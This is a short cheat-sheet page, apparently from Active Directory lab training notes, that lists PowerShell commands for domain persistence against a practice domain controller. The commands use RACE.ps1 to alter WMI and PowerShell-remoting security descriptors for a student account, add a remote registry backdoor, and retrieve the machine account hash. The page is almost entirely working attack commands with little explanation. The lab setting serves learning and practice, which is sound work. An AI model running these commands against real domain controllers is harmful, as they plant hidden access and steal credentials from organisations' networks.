---
layout: page
title: "# Exploit WMI Security Descriptors"
permalink: /ad_cheatsheets/exploit_wmi_security_descriptors
---

# Exploit WMI Security Descriptors

## Modify descriptor for WMI to allow user to access the WMI

```powershell
. C:\AD\Tools\RACE.ps1

Set-RemoteWMI -SamAccountName student648 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose

```

## Execute WMI Queries

```powershell
gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

## Also can be done, Powershell Remoting

```powershell
Set-RemotePSRemoting â€“SamAccountName student648 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

```powershell
Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.localdcorp\student648
```

## Modify Perms

```powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student648 
```

## Retrieve Hash

```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

[What is an AdminSDHolder Attack and How to Defend Against it?](https://www.lepide.com/blog/what-is-an-adminsdholder-attack-and-how-to-defend-against-it/)

[Security Descriptors](https://book.hacktricks.xyz/windows/active-directory-methodology/security-descriptors)
